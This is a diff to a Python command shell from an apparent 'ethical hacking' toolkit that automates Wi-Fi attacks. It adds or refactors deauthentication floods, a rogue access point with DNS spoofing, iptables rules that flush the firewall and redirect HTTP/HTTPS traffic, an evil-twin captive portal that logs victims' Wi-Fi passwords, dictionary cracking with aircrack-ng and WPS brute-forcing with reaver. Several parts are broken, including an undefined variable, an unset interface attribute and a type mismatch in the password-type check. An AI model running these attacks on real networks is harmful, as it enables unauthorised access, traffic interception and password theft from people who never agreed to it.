@@ -18,15 +18,34 @@ class WifiShell(cmd2.Cmd):
     def __init__(self):
         super().__init__(auto_load_commands=False)
         self.resultsPath = "/tmp/netspion/Wifi/"
-        self.adapter = self.wifi_bssid = self.channel = self.device_bssid = (
-            self.capfile
-        ) = self.ap_adapter = self.ssid = self.ap_channel = ""
+        self.adapter = self.masq_interface = self.wpa_type = self.wordfile = (
+            self.wifi_bssid
+        ) = self.channel = self.device_bssid = self.capfile = self.ap_adapter = (
+            self.ssid
+        ) = self.ap_channel = ""
         self.add_settable(cmd2.Settable("adapter", str, "Wifi adapter name", self))
+        self.add_settable(
+            cmd2.Settable(
+                "masq_interface", str, "Interface name to masquerade traffic", self
+            )
+        )
+        self.add_settable(
+            cmd2.Settable("wpa_type", str, "Wifi Password Type: WEP (1) / WPA-PSK(2)")
+        )
         self.add_settable(
             cmd2.Settable(
                 "capfile",
                 str,
                 ".cap file path",
+                self,
+                completer=cmd2.Cmd.path_complete,
+            )
+        )
+        self.add_settable(
+            cmd2.Settable(
+                "wordfile",
+                str,
+                "Wordfile file path",
                 self,
                 completer=cmd2.Cmd.path_complete,
             )
@@ -76,6 +95,58 @@ class WifiShell(cmd2.Cmd):
                 ) = self.reloadConf()
         self.do_help("-v")
 
+    def makeDNSMasqConf(self):
+        dnsmasqConf = open(self.resultsPath + "dnsmasq.conf", "w")
+        # Make cfgs
+        dnsmasqConf.write(
+            f"""interface={self.ap_adapter}
+dhcp-range=192.168.2.2,192.168.2.230,255.255.255.0,12h
+dhcp-option=3,192.168.2.1
+dhcp-option=6,192.168.2.1
+no-hosts
+addn-hosts={self.resultsPath}hosts
+no-resolv
+server=8.8.8.8
+log-queries
+log-dhcp
+listen-address=127.0.0.1
+listen-address=192.168.2.1"""
+        )
+        dnsmasqConf.close()
+
+    def makeHostapdConf(self):
+        hostapdConf = open(self.resultsPath + "hostapd.conf", "w")
+        hostapdConf.write(
+            f"""interface={self.ap_adapter}
+driver=nl80211
+ssid={self.ssid}
+hw_mode=g
+channel={self.ap_channel}
+macaddr_acl=0
+ignore_broadcast_ssid=0"""
+        )
+        hostapdConf.close()
+
+    def setFirewallRules(self):
+        rt.normalCapture(
+            f"ifconfig {self.ap_adapter} up 192.168.2.1 netmask 255.255.255.0;\
+            route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1;\
+            iptables-save > {self.resultsPath}iptables.bkp;\
+            iptables --flush;\
+            iptables --table nat --flush;\
+            iptables --delete-chain;\
+            iptables --table nat --delete-chain;\
+            iptables --table nat --append POSTROUTING --out-interface={self.out_interface} -j MASQUERADE;\
+            iptables --append FORWARD --in-interface {self.ap_adapter} -j ACCEPT;\
+            echo 1 > /proc/sys/net/ipv4/ip_forward;\
+            iptables -A INPUT -p tcp --dport 443 -j ACCEPT;\
+            iptables -A INPUT -p tcp --dport 80 -j ACCEPT;\
+            iptables -A INPUT -p udp --dport 53 -j ACCEPT;\
+            iptables -A INPUT -p udp --dport 67 -j ACCEPT;\
+            iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.2.1:80;\
+            iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.2.1:443"
+        )
+
     def reloadConf(self):
         file = open(self.resultsPath + "saved.conf", "r")
         dict = {}
@@ -101,183 +172,157 @@ class WifiShell(cmd2.Cmd):
             self.ap_channel,
         )
 
-    def deAuthAttack(wifi_bssid, adapter):
-        if check_var([wifi_bssid, adapter]):
-            device_bssid = str(input("Device BSSID [blank all]: "))
-            if device_bssid:
-                run_task.newTerminal(
+    def do_deAuthAttack(self, arg):
+        "Start de-authentication attack"
+        if check_vars(
+            [
+                {"name": "wifi_bssid", "value": self.wifi_bssid},
+                {"name": "adapter", "value": self.adapter},
+            ]
+        ):
+            if self.device_bssid:
+                rt.runBackground(
                     [
                         "aireplay-ng",
                         "-0",
                         "0",
                         "-a",
-                        wifi_bssid,
+                        self.wifi_bssid,
                         "-c",
-                        device_bssid,
-                        adapter,
-                    ]
+                        self.device_bssid,
+                        self.adapter,
+                    ],
+                    None,
                 )
             else:
-                run_task.newTerminal(
+                rt.runBackground(
                     [
                         "aireplay-ng",
                         "-0",
                         "0",
                         "-a",
-                        wifi_bssid,
-                        adapter,
-                    ]
+                        self.wifi_bssid,
+                        self.adapter,
+                    ],
+                    None,
                 )
 
-    def rogueAPAttack(ssid, ap_adapter, ap_channel, resultsPath):
-        if check_var([ssid, ap_adapter, ap_channel]):
+    def do_rogueAPAttack(self, arg):
+        if check_vars(
+            [
+                {"name": "ssid", "value": self.ssid},
+                {"name": "ap_channel", "value": self.ap_channel},
+                {"name": "ap_adapter", "value": self.ap_adapter},
+            ]
+        ):
             out_interface = str(input("Output interface to masquerade traffic: "))
-            dnsmasqConf = open(resultsPath + "dnsmasq.conf", "w")
-            # Make cfgs
-            dnsmasqConf.write(
-                f"""interface={ap_adapter}
-    dhcp-range=192.168.2.2,192.168.2.230,255.255.255.0,12h
-    dhcp-option=3,192.168.2.1
-    dhcp-option=6,192.168.2.1
-    no-hosts
-    addn-hosts={resultsPath}hosts
-    no-resolv
-    server=8.8.8.8
-    log-queries
-    log-dhcp
-    listen-address=127.0.0.1
-    listen-address=192.168.2.1"""
-            )
-            dnsmasqConf.close()
-            hostapdConf = open(resultsPath + "hostapd.conf", "w")
-            hostapdConf.write(
-                f"""interface={ap_adapter}
-    driver=nl80211
-    ssid={ssid}
-    hw_mode=g
-    channel={ap_channel}
-    macaddr_acl=0
-    ignore_broadcast_ssid=0"""
-            )
-            hostapdConf.close()
+            self.makeDNSMasqConf()
+            self.makeHostapdConf()
             # Start AP
-            run_task.newTerminal(
+            rt.runBackground(
                 [
                     "hostapd",
-                    resultsPath + "hostapd.conf",
-                ]
+                    self.resultsPath + "hostapd.conf",
+                ],
+                None,
             )
             # Start DNS spoof & DHCP
-            run_task.newTerminal(
+            rt.runBackground(
                 [
                     "dnsmasq",
                     "-C",
-                    resultsPath + "dnsmasq.conf",
+                    self.resultsPath + "dnsmasq.conf",
                     "-d",
-                ]
+                ],
+                None,
             )
             # Set Firewall rules and network
-            run_task.normalShell(
-                f"ifconfig {ap_adapter} up 192.168.2.1 netmask 255.255.255.0;\
-                            route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1;\
-                            iptables-save > {resultsPath}iptables.bkp;\
-                            iptables --flush;\
-                            iptables --table nat --flush;\
-                            iptables --delete-chain;\
-                            iptables --table nat --delete-chain;\
-                            iptables --table nat --append POSTROUTING --out-interface={out_interface} -j MASQUERADE;\
-                            iptables --append FORWARD --in-interface {ap_adapter} -j ACCEPT;\
-                            echo 1 > /proc/sys/net/ipv4/ip_forward;\
-                            iptables -A INPUT -p tcp --dport 443 -j ACCEPT;\
-                            iptables -A INPUT -p tcp --dport 80 -j ACCEPT;\
-                            iptables -A INPUT -p udp --dport 53 -j ACCEPT;\
-                            iptables -A INPUT -p udp --dport 67 -j ACCEPT;\
-                            iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.2.1:80;\
-                            iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.2.1:443"
-            )
+            self.setFirewallRules()
             # CP tmp Hosts file to be used with DNS spoof
-            run_task.normalShell(f"cp ./EthicalHacking/Wifi/hosts {resultsPath}")
+            rt.normalCapture(f"cp ./EthicalHacking/Wifi/hosts {self.resultsPath}")
 
-    def cpAttack(ssid, resultsPath, capfile):
-        if check_var([ssid]):
+    def do_cpAttack(self, arg):
+        if check_vars([ssid]):
             # Copy cfgs to tmp folder
-            run_task.normalCapture(
+            rt.normalCapture(
                 [
                     "cp",
                     "-Rv",
                     "./EthicalHacking/Wifi/captive_portal",
-                    resultsPath,
+                    self.resultsPath,
                 ]
             )
-            run_task.normalCapture(
-                ["chmod", "-R", "777", resultsPath + "captive_portal"]
+            rt.normalCapture(
+                ["chmod", "-R", "777", self.resultsPath + "captive_portal"]
             )
 
-            print(string_format.info("\nPortals Availables"))
-            run_task.normalShell(
-                f"ls -l {resultsPath}captive_portal/portals | grep '^d' | cut -d ' ' -f10"
+            print(sf.info("\nPortals Availables"))
+            rt.normalShell(
+                f"ls -l {self.resultsPath}captive_portal/portals | grep '^d' | cut -d ' ' -f10"
             )
             portal = str(input("\nSelect a portal name: "))
 
-            run_task.normalCapture(
+            rt.normalCapture(
                 [
                     "sed",
                     "-i",
-                    f"s/WIFI_SSID/{ssid}/g",
-                    f"{resultsPath}captive_portal/portals/{portal}/index.html",
+                    f"s/WIFI_SSID/{self.ssid}/g",
+                    f"{self.resultsPath}captive_portal/portals/{portal}/index.html",
                 ]
             )
 
-            run_task.normalCapture(
+            rt.normalCapture(
                 [
                     "cp",
                     "./EthicalHacking/Wifi/captive_portal/check.php",
-                    f"{resultsPath}captive_portal/portals/{portal}",
+                    f"{self.resultsPath}captive_portal/portals/{portal}",
                 ]
             )
 
-            run_task.normalCapture(
+            rt.normalCapture(
                 [
                     "sed",
                     "-i",
-                    f"s+CAP_FILE_PATH+{capfile}+g",
-                    f"{resultsPath}captive_portal/portals/{portal}/check.php",
+                    f"s+CAP_FILE_PATH+{self.capfile}+g",
+                    f"{self.resultsPath}captive_portal/portals/{portal}/check.php",
                 ]
             )
 
-            run_task.normalCapture(
+            rt.normalCapture(
                 [
                     "sed",
                     "-i",
-                    f"s/WIFI_SSID/{ssid}/g",
-                    f"{resultsPath}captive_portal/portals/{portal}/check.php",
+                    f"s/WIFI_SSID/{self.ssid}/g",
+                    f"{self.resultsPath}captive_portal/portals/{portal}/check.php",
                 ]
             )
 
-            run_task.normalCapture(
+            rt.normalCapture(
                 [
                     "sed",
                     "-i",
                     f"s/PORTAL_ROOT/{portal}/g",
-                    f"{resultsPath}captive_portal/lighttpd.conf",
+                    f"{self.resultsPath}captive_portal/lighttpd.conf",
                 ]
             )
             # Start Web server
-            run_task.newTerminal(
+            rt.runBackground(
                 [
                     "lighttpd",
                     "-D",
                     "-f",
-                    resultsPath + "captive_portal/lighttpd.conf",
+                    self.resultsPath + "captive_portal/lighttpd.conf",
                 ]
             )
             # Monitor password hit
-            run_task.newTerminal(["tail", "-f", resultsPath + "captive_portal/hit.txt"])
+            rt.runBackground(
+                ["tail", "-f", self.resultsPath + "captive_portal/hit.txt"]
+            )
 
     def do_monitor_mode(self, arg):
         "Set adapter to monitor mode"
         if check_vars([{"name": "adapter", "value": self.adapter}]):
-            rt.runBackground(["airmon-ng", "start", self.adapter])
+            rt.runBackground(["airmon-ng", "start", self.adapter], None)
             # self.adapter = self.adapter + "mon"
 
     def do_show_wifis(self, arg):
@@ -291,7 +336,8 @@ class WifiShell(cmd2.Cmd):
                     self.adapter,
                     "-w",
                     self.resultsPath + "availableWifis",
-                ]
+                ],
+                None,
             )
 
     def do_wifi_monitor(self, arg):
@@ -319,9 +365,86 @@ class WifiShell(cmd2.Cmd):
                     "-w",
                     output_file,
                     self.adapter,
-                ]
+                ],
+                None,
             )
             self.capfile = output_file + ".cap"
+
+    def do_wifi_passw_crack(self, arg):
+        "Wifi password crack"
+        if check_vars(
+            [
+                {"name": "wpa_type", "value": self.wpa_type},
+                {"name": "wordfile", "value": self.wordfile},
+                {"name": "capfile", "value": self.capfile},
+            ]
+        ):
+            if self.wpa_type == 1:
+                rt.runBackground(
+                    [
+                        "aircrack-ng",
+                        "-a1",
+                        "-b",
+                        self.wifi_bssid,
+                        "-w",
+                        self.wordfile,
+                        self.capfile,
+                    ],
+                    None,
+                )
+            elif self.wpa_type == 2:
+                rt.runBackground(
+                    [
+                        "aircrack-ng",
+                        "-a2",
+                        "-b",
+                        self.wifi_bssid,
+                        "-w",
+                        self.wordfile,
+                        self.capfile,
+                    ],
+                    None,
+                )
+            else:
+                print("Invalid password type")
+
+    def do_wps_show(self, arg):
+        "Show available WPS"
+        if check_vars([{"name": "adapter", "value": self.adapter}]):
+            rt.runBackground(
+                [
+                    "wash",
+                    "-i",
+                    self.adapter,
+                    "-O",
+                    self.resultsPath + "WPS_scan",
+                ],
+                None,
+            )
+
+    def do_wps_crack(self, arg):
+        "WPS crack"
+        if check_vars(
+            [
+                {"name": "adapter", "value": self.adapter},
+                {"name": "wifi_bssid", "value": self.wifi_bssid},
+                {"name": "channel", "value": self.channel},
+            ]
+        ):
+            rt.runBackground(
+                [
+                    "reaver",
+                    "-i",
+                    self.adapter,
+                    "-b",
+                    self.wifi_bssid,
+                    "-c",
+                    self.channel,
+                    "-O",
+                    self.resultsPath + "_WPSCrack",
+                ],
+                None,
+            )
 
 
 def main():
